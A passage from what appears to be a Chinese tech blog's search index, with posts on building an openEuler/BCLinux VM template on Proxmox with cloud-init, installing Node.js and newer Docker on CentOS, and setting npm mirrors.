用于调整虚拟机的分区设置，qemu-guest-agent 用于虚拟机接受宿主机的命令并反馈结果，后续PVE管理界面可以直接显示IP地址信息。</li>\n<li>BCLinux 已经预置了 git 、net-tools 等常用工具，但没有yum-utils软件包，而是自带 dnf 管理器 yum-config-manager</li>\n</ul>\n<blockquote>\n<p>注意：dnf 工具包中reposync 和 createrepo 等命令的参数有所不同！！！</p>\n</blockquote>\n</li>\n<li><p>手工调整cloudinit配置文件<code>/etc/cloud/cloud.cfg</code><br>当前cloud-init的版本是 19.4 ，建议修改以下参数：</p>\n<ul>\n<li>disable_root：false，即允许直接登录虚拟机（默认不允许 root 登录）</li>\n<li>ssh_pwauth：1，即允许以 ssh passwod 方式登录（默认只能通过 private key 登录）</li>\n<li>package-update-upgrade-install：以 # 开始注释该行，即避免安装后自动更新系统软件</li>\n<li>default-user：以 # 开始注释该段落，默认将创建 openEuler 用户</li>\n</ul>\n</li>\n<li><p>虚拟机关机，并在PVE控制台上将其转换为模版templete，母鸡就此完成。<br>后续，就可以在 PVE 控制台上配置 Cloud-init 的参数，并 clone 该模版启动小鸡了。</p>\n</li>\n</ol>\n<h2 id=\"三、注意事项\"><a href=\"#三、注意事项\" class=\"headerlink\" title=\"三、注意事项\"></a>三、注意事项</h2><h3 id=\"1-上层软件栈\"><a href=\"#1-上层软件栈\" class=\"headerlink\" title=\"1. 上层软件栈\"></a>1. 上层软件栈</h3><p>好消息！官方软件源已包含了许多常用软件，最新版本信息如下：</p>\n<ul>\n<li>nginx: 1.16.1</li>\n<li>python3: 3.7.9</li>\n<li>docker: 18.09.0</li>\n<li>docker-compose: 1.22.0</li>\n<li>openjdk(java): 11.0.12</li>\n<li>nodejs: v12.22.11</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@Copy-of-VM-OpenEular21 yum.repos.d]<span class=\"comment\"># docker -v</span></span><br><span class=\"line\">Docker version 18.09.0, build a8959d5</span><br><span class=\"line\">[root@Copy-of-VM-OpenEular21 yum.repos.d]<span class=\"comment\"># docker-compose -v</span></span><br><span class=\"line\">docker-compose version 1.22.0, build f46880f</span><br><span class=\"line\">[root@Copy-of-VM-OpenEular21 yum.repos.d]<span class=\"comment\"># java -version</span></span><br><span class=\"line\">openjdk version <span class=\"string\">&quot;11.0.12&quot;</span> 2021-07-20</span><br><span class=\"line\">OpenJDK Runtime Environment Bisheng (build 11.0.12+9)</span><br><span class=\"line\">OpenJDK 64-Bit Server VM Bisheng (build 11.0.12+9, mixed mode, sharing)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Qemu-Guest-Agent-系统服务\"><a href=\"#2-Qemu-Guest-Agent-系统服务\" class=\"headerlink\" title=\"2. Qemu Guest Agent 系统服务\"></a>2. Qemu Guest Agent 系统服务</h3><p>PVE在安装虚拟机时会见到<code>Qemu GA</code>这个选项，是开启还是关闭呢？</p>\n<p>Qemu 代理即 qemu-guest-agent，是一个运行在虚拟机里面的程序 qemu-guest-agent是一个帮助程序，守护程序，它安装在虚拟机中，用于在主机和虚拟机之间交换信息，以及在虚拟机中执行命令。<br>在Proxmox VE中，qemu代理有以下作用：</p>\n<ul>\n<li>正确关闭虚拟机，而不是依赖ACPI命令或Windows策略</li>\n<li>在进行备份时冻结来宾文件系统（在Windows上，使用卷影复制服务VSS）</li>\n<li>使用 DHCP 时，可以在控制台上直接看到虚机的 IP 地址，省去登录小鸡的命令操作了。。。</li>\n</ul>\n<p><img src=\"/2023/08/17/BCLinux-oe21-10-%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/qemu-ga.png\" alt=\"qa\"><br>如果想用，不仅需要在pve里开启这个选项，还需要手动安装。</p>\n<h3 id=\"3-Kubernetes集群安装\"><a href=\"#3-Kubernetes集群安装\" class=\"headerlink\" title=\"3. Kubernetes集群安装\"></a>3. Kubernetes集群安装</h3><p>安装过程参考：<a href=\"https://docs.openeuler.org/zh/docs/20.03_LTS_SP1/docs/thirdparty_migration/k8sinstall.html\">K8S 迁移至 openEuler 指导</a></p>\n<ol>\n<li><p>安装docker并调整配置文件，当前版本<code>18.09.0</code></p>\n</li>\n<li><p>yum安装kubenet组件<br> <code>yum install -y kubelet-1.15.10 kubeadm-1.15.10 kubectl-1.15.10 kubernetes-cni-0.7.5</code></p>\n</li>\n<li><p>通过<code>kubeadm config images list</code>获取需要的镜像列表</p>\n <figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">k8s.gcr.io/kube-apiserver:v1.15.12</span><br><span class=\"line\">k8s.gcr.io/kube-controller-manager:v1.15.12</span><br><span class=\"line\">k8s.gcr.io/kube-scheduler:v1.15.12</span><br><span class=\"line\">k8s.gcr.io/kube-proxy:v1.15.12</span><br><span class=\"line\">k8s.gcr.io/pause:3.1</span><br><span class=\"line\">k8s.gcr.io/etcd:3.3.10</span><br><span class=\"line\">k8s.gcr.io/coredns:1.3.1</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>从<code>gcmirrors/kube-apiserver:v1.15.12</code>等镜像站点获取，再改标签为<code>k8s.gcr.io</code></p>\n</li>\n<li><p>启动安装，注意版本号有区别</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl daemon-reload</span><br><span class=\"line\">systemctl restart kubelet</span><br><span class=\"line\">kubeadm init --kubernetes-version v1.15.12 --pod-network-cidr=10.244.0.0/16  </span><br></pre></td></tr></table></figure>\n</li>\n<li><p>安装并启动calico网络插件</p>\n</li>\n<li><p>Master节点启动，并逐一启动Worker各个节点</p>\n</li>\n</ol>\n<hr>\n<h2 id=\"附录一：YUM-官方软件源配置\"><a href=\"#附录一：YUM-官方软件源配置\" class=\"headerlink\" title=\"附录一：YUM 官方软件源配置\"></a>附录一：YUM 官方软件源配置</h2><figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv ~]# ls /etc/yum.repos.d</span><br><span class=\"line\">BCLinux.repo</span><br><span class=\"line\"></span><br><span class=\"line\">[root@MiWiFi-RA70-srv ~]# more /etc/yum.repos.d/*</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">BCLinux-release.repo</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\"><span class=\"comment\">#</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">The mirror system uses the connecting IP address of the client and the</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">update status of each mirror to pick mirrors that are updated to and</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">geographically close to the client.  You should use this <span class=\"keyword\">for</span> BCLinux updates</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">unless you are manually picking other mirrors.</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\"><span class=\"comment\"># If the mirrorlist= does not work for you, as a fall back you can try the</span></span> </span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">remarked out baseurl= line instead.</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\"><span class=\"comment\">#</span></span></span><br><span class=\"line\">[baseos]</span><br><span class=\"line\">name=BC-Linux-release - baseos</span><br><span class=\"line\">baseurl=http://mirrors.bclinux.org/bclinux/oe21.10/OS/$basearch/</span><br><span class=\"line\">gpgcheck=1</span><br><span class=\"line\">enabled=1</span><br><span class=\"line\">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-BCLinux-For-Euler</span><br><span class=\"line\"></span><br><span class=\"line\">[everything]</span><br><span class=\"line\">name=BC-Linux-release - everything</span><br><span class=\"line\">baseurl=http://mirrors.bclinux.org/bclinux/oe21.10/everything/$basearch/</span><br><span class=\"line\">gpgcheck=1</span><br><span class=\"line\">enabled=1</span><br><span class=\"line\">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-BCLinux-For-Euler</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">[update]</span><br><span class=\"line\">name=BC-Linux-release - update</span><br><span class=\"line\">baseurl=http://mirrors.bclinux.org/bclinux/oe21.10/update/$basearch/</span><br><span class=\"line\">gpgcheck=1</span><br><span class=\"line\">enabled=1</span><br><span class=\"line\">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-BCLinux-For-Euler</span><br><span class=\"line\"></span><br><span class=\"line\">[extras]</span><br><span class=\"line\">name=BC-Linux-release - extras</span><br><span class=\"line\">baseurl=http://mirrors.bclinux.org/bclinux/oe21.10/extras/$basearch/</span><br><span class=\"line\">gpgcheck=1</span><br><span class=\"line\">enabled=1</span><br><span class=\"line\">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-BCLinux-For-Euler</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"附录二：cloudinit-的原始配置\"><a href=\"#附录二：cloudinit-的原始配置\" class=\"headerlink\" title=\"附录二：cloudinit 的原始配置\"></a>附录二：cloudinit 的原始配置</h2><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv ~]# cat /etc/cloud/cloud.cfg</span><br><span class=\"line\"># The top level settings are used as module</span><br><span class=\"line\"># and system configuration.</span><br><span class=\"line\"></span><br><span class=\"line\"># A set of users which may be applied and/or used by various modules</span><br><span class=\"line\"># when a &#x27;default&#x27; entry is found it will reference the &#x27;default_user&#x27;</span><br><span class=\"line\"># from the distro configuration specified below</span><br><span class=\"line\">users:</span><br><span class=\"line\">   - default</span><br><span class=\"line\"></span><br><span class=\"line\"># If this is set, &#x27;root&#x27; will not be able to ssh in and they</span><br><span class=\"line\"># will get a message to login instead as the default $user</span><br><span class=\"line\">disable_root: true</span><br><span class=\"line\"></span><br><span class=\"line\">mount_default_fields: [~, ~, &#x27;auto&#x27;, &#x27;defaults,nofail&#x27;, &#x27;0&#x27;, &#x27;2&#x27;]</span><br><span class=\"line\">resize_rootfs_tmp: /dev</span><br><span class=\"line\">ssh_pwauth:   0</span><br><span class=\"line\"></span><br><span class=\"line\"># This will cause the set+update hostname module to not operate (if true)</span><br><span class=\"line\">preserve_hostname: false</span><br><span class=\"line\"></span><br><span class=\"line\"># Example datasource config</span><br><span class=\"line\"># datasource:</span><br><span class=\"line\">#    Ec2:</span><br><span class=\"line\">#      metadata_urls: [ &#x27;blah.com&#x27; ]</span><br><span class=\"line\">#      timeout: 5 # (defaults to 50 seconds)</span><br><span class=\"line\">#      max_wait: 10 # (defaults to 120 seconds)</span><br><span class=\"line\"></span><br><span class=\"line\"># The modules that run in the &#x27;init&#x27; stage</span><br><span class=\"line\">cloud_init_modules:</span><br><span class=\"line\"> - migrator</span><br><span class=\"line\"> - seed_random</span><br><span class=\"line\"> - bootcmd</span><br><span class=\"line\"> - write-files</span><br><span class=\"line\"> - growpart</span><br><span class=\"line\"> - resizefs</span><br><span class=\"line\"> - disk_setup</span><br><span class=\"line\"> - mounts</span><br><span class=\"line\"> - set_hostname</span><br><span class=\"line\"> - update_hostname</span><br><span class=\"line\"> - update_etc_hosts</span><br><span class=\"line\"> - ca-certs</span><br><span class=\"line\"> - rsyslog</span><br><span class=\"line\"> - users-groups</span><br><span class=\"line\"> - ssh</span><br><span class=\"line\"></span><br><span class=\"line\"># The modules that run in the &#x27;config&#x27; stage</span><br><span class=\"line\">cloud_config_modules:</span><br><span class=\"line\"> - ssh-import-id</span><br><span class=\"line\"> - locale</span><br><span class=\"line\"> - set-passwords</span><br><span class=\"line\"> - spacewalk</span><br><span class=\"line\"> - yum-add-repo</span><br><span class=\"line\"> - ntp</span><br><span class=\"line\"> - timezone</span><br><span class=\"line\"> - disable-ec2-metadata</span><br><span class=\"line\"> - runcmd</span><br><span class=\"line\"></span><br><span class=\"line\"># The modules that run in the &#x27;final&#x27; stage</span><br><span class=\"line\">cloud_final_modules:</span><br><span class=\"line\"> - package-update-upgrade-install</span><br><span class=\"line\"> - puppet</span><br><span class=\"line\"> - chef</span><br><span class=\"line\"> - mcollective</span><br><span class=\"line\"> - salt-minion</span><br><span class=\"line\"> - rightscale_userdata</span><br><span class=\"line\"> - scripts-vendor</span><br><span class=\"line\"> - scripts-per-once</span><br><span class=\"line\"> - scripts-per-boot</span><br><span class=\"line\"> - scripts-per-instance</span><br><span class=\"line\"> - scripts-user</span><br><span class=\"line\"> - ssh-authkey-fingerprints</span><br><span class=\"line\"> - keys-to-console</span><br><span class=\"line\"> - phone-home</span><br><span class=\"line\"> - final-message</span><br><span class=\"line\"> - power-state-change</span><br><span class=\"line\"></span><br><span class=\"line\"># System and/or distro specific settings</span><br><span class=\"line\"># (not accessible to handlers/transforms)</span><br><span class=\"line\">system_info:</span><br><span class=\"line\">   # This will affect which distro class gets used</span><br><span class=\"line\">   distro: openEuler</span><br><span class=\"line\">   # Default user name + that default users groups (if added/used)</span><br><span class=\"line\">   default_user:</span><br><span class=\"line\">     name: openEuler</span><br><span class=\"line\">     lock_passwd: True</span><br><span class=\"line\">     gecos: openEuler Cloud User</span><br><span class=\"line\">     groups: [wheel, adm, systemd-journal]</span><br><span class=\"line\">     sudo: [&quot;ALL=(ALL) NOPASSWD:ALL&quot;]</span><br><span class=\"line\">     shell: /bin/bash</span><br><span class=\"line\">   # Other config here will be given to the distro class and/or path classes</span><br><span class=\"line\">   paths:</span><br><span class=\"line\">      cloud_dir: /var/lib/cloud/</span><br><span class=\"line\">      templates_dir: /etc/cloud/templates/</span><br><span class=\"line\">   ssh_svcname: sshd</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.openeuler.org/zh/download/archive/\">openEuler 官网软件源</a></li>\n<li><a href=\"https://blog.csdn.net/bright69/article/details/126783599\">BCLinux ECS 基线版本的构造分析</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1987533\">通过QEMU-GuestAgent实现从外部注入写文件到KVM虚拟机内部</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/2008066\">PVE创建openEuler虚拟机模板</a></li>\n<li><a href=\"https://gameapp.club/post/2022-07-30-custom-cloud-init-for-pve/\">基于cloud-init定制虚拟机</a></li>\n<li><a href=\"https://help.aliyun.com/zh/ecs/methods-and-impacts-of-switching-the-network-service-for-instances-that-run-alibaba-cloud-linux-2\">Alibaba Cloud Linux 2实例修改网络服务的方法及影响说明</a></li>\n</ul>\n"},{"title":"Centos7安装node.js的操作步骤","url":"/2020/10/11/Centos7%E5%AE%89%E8%A3%85node-js%E7%9A%84%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4/","content":"<p>我当前使用的是Centos7.8，采用<code>yum install nodejs</code>方式安装当然是可以的，但是node版本只有<code>6.17.1</code>，许多新的软件无法安装，因此建议采用手工方式安装node.js</p>\n<h2 id=\"下载安装文件\"><a href=\"#下载安装文件\" class=\"headerlink\" title=\"下载安装文件\"></a>下载安装文件</h2><p>Node.js的官网地址是 <a href=\"https://nodejs.org/dist/\">https://nodejs.org/dist/</a>。<br>当前最新版本是<code>14.13.1</code>，LTS版本<code>12.19.0</code>，本人建议采用版本<code>14.2.0</code><br>至于CPU架构，Centos当然是<code>linux-x64</code></p>\n<p>官网速度太慢就算了，推荐腾讯云的镜像地址：<a href=\"https://mirrors.cloud.tencent.com/nodejs-release/\">https://mirrors.cloud.tencent.com/nodejs-release/</a></p>\n<h2 id=\"解压-安装\"><a href=\"#解压-安装\" class=\"headerlink\" title=\"解压 &amp; 安装\"></a>解压 &amp; 安装</h2><p>安装目录默认是<code>/usr/local/node/</code>，此时命令文件位于<code>/usr/local/node/bin/</code>。<br>注意，以后npm安装软件的命令文件都在此目录，因此后续要追加环境变量<code>$PATH</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://mirrors.cloud.tencent.com/nodejs-release/v14.2.0/node-v14.2.0-linux-x64.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\">tar -xvf node-v14.2.0-linux-x64.tar.gz</span><br><span class=\"line\"><span class=\"built_in\">mv</span> node-v14.2.0-linux-x64 /usr/local/node</span><br><span class=\"line\"><span class=\"built_in\">ls</span> -l /usr/local/node/bin</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"设置环境变量PATH\"><a href=\"#设置环境变量PATH\" class=\"headerlink\" title=\"设置环境变量PATH\"></a>设置环境变量PATH</h2><p>手工编辑全局配置文件<code>vi /etc/profile</code>，并在最后添加</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">export NODE_HOME=/usr/local/node</span><br><span class=\"line\">export PATH=$NODE_HOME/bin:$PATH</span><br></pre></td></tr></table></figure>\n\n<p>最后，运行命令行：<code>source /etc/profile</code>，以便当前环境激活配置，否则将在重启后生效。</p>\n<h2 id=\"检查方法\"><a href=\"#检查方法\" class=\"headerlink\" title=\"检查方法\"></a>检查方法</h2><p>如果安装正常，现在目录<code>/usr/local/node/</code>的状态应该是这样的，其中有三个命令文件：node、npm、npx<br>nodejs与npm的关系有点类似于redhat系统与yum的关系，npm就是node的包管理工具</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">├── bin</span><br><span class=\"line\">│   ├── node</span><br><span class=\"line\">│   ├── npm -&gt; ../lib/node_modules/npm/bin/npm-cli.js</span><br><span class=\"line\">│   └── npx -&gt; ../lib/node_modules/npm/bin/npx-cli.js</span><br><span class=\"line\">├── CHANGELOG.md</span><br><span class=\"line\">├── include</span><br><span class=\"line\">│   └── node</span><br><span class=\"line\">├── lib</span><br><span class=\"line\">│   └── node_modules</span><br><span class=\"line\">├── LICENSE</span><br><span class=\"line\">├── README.md</span><br><span class=\"line\">└── share</span><br><span class=\"line\">    ├── doc</span><br><span class=\"line\">    ├── man</span><br><span class=\"line\">    └── systemtap</span><br></pre></td></tr></table></figure>\n\n<p>查看安装目录和版本号的方法</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@centos7 local]# which node</span><br><span class=\"line\">/usr/local/node/bin/node</span><br><span class=\"line\"></span><br><span class=\"line\">[root@centos7 local]# node -v</span><br><span class=\"line\">v12.19.0</span><br><span class=\"line\"></span><br><span class=\"line\">[root@centos7 local]# npm -v</span><br><span class=\"line\">6.14.8</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"为npm设置国内镜像源\"><a href=\"#为npm设置国内镜像源\" class=\"headerlink\" title=\"为npm设置国内镜像源\"></a>为npm设置国内镜像源</h2><p>npm的默认安装源在境外，实在太慢了，通常有几种加速方案</p>\n<h3 id=\"阿里cnpm\"><a href=\"#阿里cnpm\" class=\"headerlink\" title=\"阿里cnpm\"></a>阿里cnpm</h3><p>阿里巴巴的淘宝团队把NMP官网的插件都同步到了在中国的服务器，提供给我们从这个服务器上稳定下载资源。<br><code>CNMP</code>同样是<code>NMP</code>的一个插件，要安装的话需要在CMD命令行控制台执行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>\n\n<p>安装完成后可以使用<code>cnpm -v</code>命令查看版本号。<br><code>cnpm</code>的用法和<code>npm</code>的用法一致，只是在执行命令的时候将<code>npm</code>改为<code>cnpm</code>。</p>\n<h3 id=\"华为云镜像\"><a href=\"#华为云镜像\" class=\"headerlink\" title=\"华为云镜像\"></a>华为云镜像</h3><p>NPM的配置文件为用户根目录下的：<code>~/.npmrc</code>（Windows路径为：<code>C:\\Users\\&lt;UserName&gt;\\.npmrc</code>）<br>运行如下命令设置：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm config <span class=\"built_in\">set</span> registry https://mirrors.huaweicloud.com/repository/npm/</span><br><span class=\"line\">npm cache clean -f</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"腾讯云镜像\"><a href=\"#腾讯云镜像\" class=\"headerlink\" title=\"腾讯云镜像\"></a>腾讯云镜像</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm config <span class=\"built_in\">set</span> registry http://mirrors.cloud.tencent.com/npm/</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"疑难杂症\"><a href=\"#疑难杂症\" class=\"headerlink\" title=\"疑难杂症\"></a>疑难杂症</h2><h3 id=\"1-Macbook-M1芯片的版本支持\"><a href=\"#1-Macbook-M1芯片的版本支持\" class=\"headerlink\" title=\"1. Macbook M1芯片的版本支持\"></a>1. Macbook M1芯片的版本支持</h3><p>2020年 Apple Macbook 推出了基于ARM指令集的 M1 自研芯片，而非原来基于x86指令集的 Intel 芯片。<br>node.js从<code>v16</code>开始，提供了M1芯片的兼容性支持，也就是darwin有 arm64 和 x64 两个版本。<br>具体可以参见 node.js官网下载页面的截图。</p>\n<img src=\"/2020/10/11/Centos7%E5%AE%89%E8%A3%85node-js%E7%9A%84%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4/node-m1.png\" class=\"\">\n\n<h3 id=\"2-Mac-OS安装npm可能出现的权限问题\"><a href=\"#2-Mac-OS安装npm可能出现的权限问题\" class=\"headerlink\" title=\"2. Mac OS安装npm可能出现的权限问题\"></a>2. Mac OS安装npm可能出现的权限问题</h3><p>Mac 用户如果在编译时可能会遇到问题，请先到 App Store 安装 Xcode，Xcode 完成后，启动并进入 <code>Preferences -&gt; Download -&gt; Command Line Tools -&gt; Install</code> 安装命令行工具。</p>\n<p>Mac用户如果在尝试过程中出现 <code>EACCES</code> 权限错误，请遵循由 <a href=\"https://docs.npmjs.com/resolving-eacces-permissions-errors-when-installing-packages-globally\">npmjs 发布的指导</a> 修复该问题。</p>\n<p>强烈建议 不要 使用 root、sudo 等方法覆盖权限。</p>\n<hr>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://my.oschina.net/cqyj/blog/3016118\">Centos7:安装node和npm &amp; npm配置全局路径</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000012099112\">npm的常用命令格式</a></li>\n<li><a href=\"https://www.ruanyifeng.com/blog/2016/10/npm_scripts.html\">npm scripts高级命令指南</a></li>\n<li><a href=\"https://www.techug.com/post/10-npm-tips-and-tricks.html\">10个 NPM 使用技巧</a></li>\n<li><a href=\"http://www.skyjia.com/2017/05/05/npm-error-extraneous/\">滥用cnpm可能导致npm版本依赖的混乱问题</a></li>\n</ul>\n"},{"title":"Centos宿主机如何安装docker最新版本","url":"/2019/10/26/Centos%E5%AE%BF%E4%B8%BB%E6%9C%BA%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85docker%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC/","content":"<h2 id=\"问题现象\"><a href=\"#问题现象\" class=\"headerlink\" title=\"问题现象\"></a>问题现象</h2><p>测试成功的APP软件包，但在宿主机上安装失败，显示docker container的DNS不成功，判断是宿主机的Docker版本太低，对Docker DNS的支持不好。  </p>\n<p>宿主机是Centos, 内核版本<code>3.10.0-1062.4.1.el7.x86_64</code>, 使用<code>yum install docker</code>安装docker，docker的最新版本号<code>1.13</code>，即使采用<code>yum update docker</code>也无法更新。  </p>\n<h2 id=\"原因分析\"><a href=\"#原因分析\" class=\"headerlink\" title=\"原因分析\"></a>原因分析</h2><p>Docker版本多次演进，现在分成社区版和企业版，安装方式已经改变。</p>\n<h2 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h2><ol>\n<li><p>删除旧版本</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo yum remove docker \\</span><br><span class=\"line\">                docker-client \\</span><br><span class=\"line\">                docker-client-latest \\</span><br><span class=\"line\">                docker-common \\</span><br><span class=\"line\">                docker-latest \\</span><br><span class=\"line\">                docker-latest-logrotate \\</span><br><span class=\"line\">                docker-logrotate \\</span><br><span class=\"line\">                docker-engine</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置安装源</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo yum install -y yum-utils \\</span><br><span class=\"line\">    device-mapper-persistent-data \\</span><br><span class=\"line\">    lvm2</span><br><span class=\"line\"></span><br><span class=\"line\">$ sudo yum-config-manager \\</span><br><span class=\"line\">    --add-repo \\</span><br><span class=\"line\">    https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>安装最新版docker</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo yum install docker-ce docker-ce-cli containerd.io</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>If prompted to accept the GPG key, verify that the fingerprint matches 060A 61C5 1B55 8A7F 742B 77AA C52F EB6B 621E 9F35, and if so, accept it.</p>\n</blockquote>\n<p> 现在<code>$ docker -v</code>检查版本，显示<code>Docker version 19.03.4, build 9013bf583a</code>，版本升级成功！！！</p>\n</li>\n<li><p>检查docker历史版本的信息</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ yum list docker-ce --showduplicates | <span class=\"built_in\">sort</span> -r</span><br><span class=\"line\">docker-ce.x86_64            3:19.03.4-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:19.03.4-3.el7                    @docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:19.03.3-3.el7                    docker-ce-stable  </span><br><span class=\"line\">docker-ce.x86_64            3:19.03.2-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:19.03.1-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:19.03.0-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.9-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.8-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.7-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.6-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.5-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.4-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.3-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.2-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.1-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.0-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            18.06.3.ce-3.el7                   docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            18.06.2.ce-3.el7                   docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            18.06.1.ce-3.el7                   docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            18.06.0.ce-3.el7                   docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            18.03.1.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            18.03.0.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.12.1.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.12.0.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.09.1.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.09.0.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.06.2.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.06.1.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.06.0.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.03.3.ce-1.el7                   docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.03.2.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.03.1.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.03.0.ce-1.el7.centos            docker-ce-stable</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><p><a href=\"https://docs.docker.com/install/linux/docker-ce/centos/\">Centos安装docker的官方文档</a></p>\n"},{"title":"Centos的服务器网卡设置方法","url":"/2020/06/25/Centos%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E5%8D%A1%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95/","content":"<h2 id=\"重装Centos系统\"><a href=\"#重装Centos系统\" class=\"headerlink\" title=\"重装Centos系统\"></a>重装Centos系统</h2><p>使用Centos安装U盘，选择最小化安装，设置root口令，设置失去，最后重新启动。</p>\n<h2 id=\"配置有线网卡\"><a href=\"#配置有线网卡\" class=\"headerlink\" 